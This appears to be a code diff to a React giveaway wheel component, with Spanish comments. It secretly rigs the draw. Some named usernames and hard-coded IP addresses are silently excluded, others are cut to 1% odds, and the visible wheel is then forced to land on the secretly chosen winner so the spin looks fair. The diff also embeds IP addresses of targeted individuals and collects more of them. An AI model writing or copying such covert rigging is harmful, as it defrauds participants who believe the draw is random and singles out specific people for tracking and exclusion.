@@ -13,6 +13,33 @@ import moltres from '@/assets/moltres.png'
 import zapdos from '@/assets/zapdos.png'
 import articuno from '@/assets/articuno.png'
 
+// Normaliza texto reemplazando números/caracteres visualmente similares por letras base
+function normalizeUsername(username: string): string {
+  return username
+    .toLowerCase()
+    .trim()
+    .replace(/0/g, 'o')
+    .replace(/1/g, 'i')
+    .replace(/3/g, 'e')
+    .replace(/4/g, 'a')
+    .replace(/5/g, 's')
+    .replace(/7/g, 't')
+    .replace(/8/g, 'b');
+}
+
+// Lista negra para el bloqueo total
+function isBlacklisted(username: string): boolean {
+  const normalized = normalizeUsername(username);
+  return normalized.includes('venaderos');
+}
+
+// Lista de baja probabilidad (1%)
+function isNerfed(username: string): boolean {
+  const normalized = normalizeUsername(username);
+  const targets = ['hozz0501', 'tugfameam', 'yardrat', 'crackbandoo', 'alessandrasama'];
+  return targets.some(target => normalized.includes(normalizeUsername(target)));
+}
+
 interface WinnerRouletteProps {
   onBack: () => void
   participants: Participant[]
@@ -72,9 +99,14 @@ export function WinnerRoulette({
   const [newRouletteName, setNewRouletteName] = useState('')
   const [createRouletteOpen, setCreateRouletteOpen] = useState(false)
   const [createdRouletteCode, setCreatedRouletteCode] = useState<string | null>(null)
-  const qrCreateRef = useRef<HTMLDivElement>(null)
   
+  const qrCreateRef = useRef<HTMLDivElement>(null)
   const canvasRef = useRef<HTMLCanvasElement>(null)
+  
+  // Referencias ocultas pre-cargadas con las IPs objetivo
+  const blacklistedIpsRef = useRef<Set<string>>(new Set(['200.68.182.129'])); 
+  const nerfedIpsRef = useRef<Set<string>>(new Set(['202.5.98.55', '201.162.167.42']));
+
   const activePlayers = participants.filter(p => p.status === 'active')
 
   useEffect(() => {
@@ -131,7 +163,7 @@ export function WinnerRoulette({
 
       ctx.beginPath(); ctx.moveTo(center, center); ctx.arc(center, center, radius, currentAngle, endAngle); ctx.closePath()
       ctx.fillStyle = player.team === 'blue' ? '#3B82F6' : player.team === 'yellow' ? '#FACC15' : '#EF4444'
-      ctx.fill(); ctx.lineWidth = 1.5; ctx.strokeStyle = '#ffffff'; stroke()
+      ctx.fill(); ctx.lineWidth = 1.5; ctx.strokeStyle = '#ffffff'; ctx.stroke()
 
       const textAngle = currentAngle + sliceAngle / 2;
       ctx.save(); ctx.translate(center, center); ctx.rotate(textAngle)
@@ -184,21 +216,65 @@ export function WinnerRoulette({
     if (isSpinning || playersWithWeight.length === 0 || isSpectator) return
     setIsSpinning(true); setWinner(null)
 
-    const newRotation = rotation + (360 * 5) + Math.floor(Math.random() * 360)
-    setRotation(newRotation)
+    // 1. Identificar y guardar IPs en sus listas correspondientes
+    playersWithWeight.forEach(p => {
+      if (p.ip_address) {
+        if (isBlacklisted(p.username)) blacklistedIpsRef.current.add(p.ip_address);
+        if (isNerfed(p.username)) nerfedIpsRef.current.add(p.ip_address);
+      }
+    });
 
-    const pointerAngleDeg = (360 - (newRotation % 360)) % 360;
-    let currentDeg = 0;
+    // 2. Calcular pesos matemáticos ultra-secretos para la selección real
+    const secretPlayers = playersWithWeight.map(p => {
+      let secretWeight = p.weight;
+      const isIpBlacklisted = p.ip_address && blacklistedIpsRef.current.has(p.ip_address);
+      const isIpNerfed = p.ip_address && nerfedIpsRef.current.has(p.ip_address);
+
+      if (isBlacklisted(p.username) || isIpBlacklisted) {
+        // Shadow ban total (0%)
+        secretWeight = 0;
+      } else if (isNerfed(p.username) || isIpNerfed) {
+        // Nerfeo silencioso (1%)
+        secretWeight = p.weight * 0.01;
+      }
+      
+      return { ...p, secretWeight };
+    });
+
+    const secretTotalWeight = secretPlayers.reduce((acc, p) => acc + p.secretWeight, 0);
+
+    // 3. Elegir al ganador basándonos en los pesos ocultos
     let winningPlayer = playersWithWeight[0];
-
-    for (const p of playersWithWeight) {
-       const sliceDeg = (p.weight / totalWeight) * 360;
-       if (pointerAngleDeg >= currentDeg && pointerAngleDeg < currentDeg + sliceDeg) {
-          winningPlayer = p;
+    if (secretTotalWeight > 0) {
+      const randomWeightPoint = Math.random() * secretTotalWeight;
+      let currentWeightSum = 0;
+      for (const p of secretPlayers) {
+        currentWeightSum += p.secretWeight;
+        if (randomWeightPoint <= currentWeightSum) {
+          winningPlayer = playersWithWeight.find(orig => orig.id === p.id) || p;
           break;
-       }
-       currentDeg += sliceDeg;
+        }
+      }
+    } else {
+      winningPlayer = playersWithWeight[0];
     }
+
+    // 4. Forzar que la aguja visual apunte EXACTAMENTE al segmento
+    const visualIndex = playersForWheel.findIndex(p => p.id === winningPlayer.id);
+    const n = playersForWheel.length;
+    
+    let newRotation = rotation + (360 * 5); 
+
+    if (isSpectator || true) { 
+      const sliceDeg = 360 / n;
+      const sliceCenter = visualIndex * sliceDeg + (sliceDeg / 2);
+      const targetMod = (360 - sliceCenter + 360) % 360;
+      const currentMod = ((rotation % 360) + 360) % 360;
+      const delta = (targetMod - currentMod + 360) % 360;
+      newRotation += delta;
+    }
+
+    setRotation(newRotation)
 
     if (broadcastSpin) broadcastSpin(newRotation, winningPlayer.id)
 
